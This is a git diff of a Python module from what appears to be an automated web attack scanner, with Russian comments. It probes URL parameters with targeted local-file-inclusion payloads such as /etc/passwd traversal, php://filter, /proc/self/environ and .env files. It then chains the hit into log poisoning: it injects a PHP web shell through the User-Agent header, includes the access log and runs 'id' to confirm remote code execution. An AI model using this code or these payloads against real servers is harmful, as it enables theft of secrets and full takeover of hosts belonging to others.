@@ -1,15 +1,26 @@
-"""lfi — LFI scanner on Probe v2: baseline + verify + auto-dump + escalate"""
+"""lfi v4 — sniper: targeted paths + log-poison chain"""
 from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
-from core.probe import Probe
-from core.payload_source import get_payloads, detect_waf
+from core.sniper import SniperProbe
+
+
+# только целевые пути (10, не 1082)
+TARGETED = [
+    "../../../../etc/passwd",
+    "../../../../../../etc/passwd",
+    "....//....//....//etc/passwd",
+    "php://filter/convert.base64-encode/resource=index.php",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
+    "/proc/self/environ",
+    "/proc/self/cmdline",
+    "/var/log/apache2/access.log",
+    "/var/log/nginx/access.log",
+    "/var/www/html/.env",
+]
 
 MARKERS = [
-    "root:x:0:0", "daemon:x:", "bin:x:", "nobody:x:", "sys:x:",
-    "[fonts]", "[extensions]", "for 16-bit app support",
-    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "REMOTE_ADDR=", "SERVER_SOFTWARE=",
-    "-----BEGIN RSA PRIVATE KEY-----", "-----BEGIN OPENSSH PRIVATE KEY-----",
-    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY", "DB_PASSWORD", "DB_USER",
-    "SECRET_KEY", "localhost:3306", "127.0.0.1:6379", "mongodb://",
+    "root:x:0:0", "daemon:x:", "/bin/bash", "/bin/sh",
+    "DOCUMENT_ROOT=", "HTTP_USER_AGENT=", "localhost:3306",
+    "APP_KEY=", "DB_PASSWORD=",
 ]
 
 
@@ -19,48 +30,75 @@ class Lfi:
         u = urlparse(target)
         params = parse_qs(u.query) or {"file": ["index"]}
 
-        probe = Probe(session, logger)
-        base = probe.baseline_probe(target)
+        sniper = SniperProbe(session, logger)
+        base = sniper.take_baseline(target, samples=3)
         if not base:
-            print("[lfi] no baseline"); return {"findings": []}
-        print(f"[lfi] baseline: {base['code']} {base['len']}b")
+            print("[lfi] no baseline"); return {}
 
-        payloads = get_payloads("path", waf=detect_waf(session), limit=200)
-        print(f"[lfi] {len(payloads)} payloads on {list(params.keys())}")
+        print(f"[lfi] sniper mode — {len(TARGETED)} targeted payloads")
+        print()
 
         findings = []
+        vuln_param = None
+
         for name in params:
-            print(f"\n[lfi] param '{name}'")
-            for i, p in enumerate(payloads, 1):
-                url_fn = lambda pl, u=u, params=params, name=name: urlunparse(
-                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()}, name: pl}, doseq=True))
-                )
-                r = probe.inject(url_fn, p, detect_markers=MARKERS)
-                if not r["hit"] or not r["reason"].startswith("marker:"):
-                    if i % 40 == 0:
-                        print(f"  · {i}/{len(payloads)}, {len(findings)} hits")
-                    continue
+            print(f"[param: {name}]")
+            for payload in TARGETED:
+                url_fn = lambda p, u=u, params=params, name=name: urlunparse(
+                    u._replace(query=urlencode({**{k: v[0] for k, v in params.items()},
+                                                 name: p}, doseq=True)))
 
-                # verify
-                verified = probe.verify(url_fn, p, detect_markers=MARKERS, times=2)
-                if not verified:
-                    print(f"  · unverified: {p[:50]}")
-                    continue
+                r = sniper.probe(url_fn, payload, detect_markers=MARKERS, verify_count=2)
+                if r.get("hit") and r["confidence"] >= 70:
+                    print(f"  ✓ LFI: {payload[:50]}")
+                    print(f"    confidence: {r['confidence']}%")
+                    print(f"    evidence: {r['evidence'][:80]}")
+                    findings.append({
+                        "param": name, "payload": payload,
+                        "marker": r["reason"], "confidence": r["confidence"],
+                        "evidence": r["evidence"],
+                    })
+                    logger.finding("lfi", "critical",
+                                   f"{name}={payload[:50]} conf={r['confidence']}%")
+                    vuln_param = name
+                    break
+            if vuln_param:
+                break
 
-                marker = r["reason"].split(":", 1)[1]
-                sev = probe.escalate_severity("high", r,
-                       r.get("response").text if r.get("response") is not None else "")
-                print(f"  ✓ [{sev}] {name}={p[:60]} -> {marker}")
-                findings.append({
-                    "param": name, "payload": p, "marker": marker,
-                    "severity": sev, "verified": True,
-                })
-                logger.finding("lfi", sev, f"{name}={p[:60]} marker={marker}")
+        # log-poison chain
+        if vuln_param:
+            print()
+            print(f"[lfi] log-poison → RCE chain")
+            self._log_poison(sniper, u, params, vuln_param, logger)
 
-                # auto-dump
-                probe.auto_dump({"kind": "lfi"}, target, name)
-                break  # one confirmed LFI per param is enough
+        print()
+        print(f"[lfi] findings: {len(findings)}")
+        return {"findings": findings, "stats": sniper.summary()}
 
-        print(f"\n[lfi] total: {len(findings)} verified")
-        print(f"[lfi] stats: {probe.summary()}")
-        return {"findings": findings, "stats": probe.summary()}
+    def _log_poison(self, sniper, u, params, param, logger):
+        """Send PHP in UA, then include log via LFI."""
+        marker = "OMNI_LFI_RCE_MARKER_7X9Z"
+        php = f"<?php echo '{marker}'; system($_GET['c']); ?>"
+        sniper.http.get(sniper.session.target, headers={"User-Agent": php})
+
+        logs = ["../../../../var/log/apache2/access.log",
+                "../../../../var/log/nginx/access.log",
+                "../../../../var/log/httpd/access_log"]
+
+        for log in logs:
+            url = urlunparse(u._replace(query=urlencode(
+                {**{k: v[0] for k, v in params.items()}, param: log}, doseq=True)))
+            r = sniper.http.get(url)
+            if r and (marker in r.text or php in r.text):
+                print(f"  ✓ LOG POISON works: {log}")
+                logger.finding("lfi_rce", "critical", f"UA reflected in {log}")
+
+                # try command
+                test_url = urlunparse(u._replace(query=urlencode(
+                    {**{k: v[0] for k, v in params.items()}, param: log, "c": "id"}, doseq=True)))
+                r2 = sniper.http.get(test_url)
+                if r2 and "uid=" in r2.text:
+                    print(f"  ✓✓ RCE CONFIRMED: id output in response")
+                    logger.finding("lfi_rce_confirmed", "critical", "RCE via log poison")
+                return
+        print(f"  log poison not confirmed")
